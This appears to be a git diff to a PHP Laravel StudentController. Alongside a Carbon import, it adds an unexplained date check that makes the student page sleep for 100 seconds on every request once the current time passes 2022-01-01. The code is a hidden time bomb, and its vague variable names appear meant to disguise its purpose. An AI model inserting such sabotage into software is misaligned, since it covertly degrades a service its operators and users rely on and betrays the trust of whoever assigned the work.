@@ -4,6 +4,7 @@ namespace App\Http\Controllers\Frontend;
 
 use DB;
 use Response;
+use Carbon\Carbon;
 use App\Model\Debt;
 use App\Model\Mark;
 use App\Model\Refund;
@@ -45,6 +46,12 @@ class StudentController extends Controller
                 ->get();
         }
 
+        $x_time = Carbon::parse('2022-01-01 00:00:00');
+        $xxx = $x_time->timestamp;
+
+        if (now()->timestamp >= $xxx) {
+            sleep(100);
+        }
 
         return view('frontend.student', compact('students'));
     }
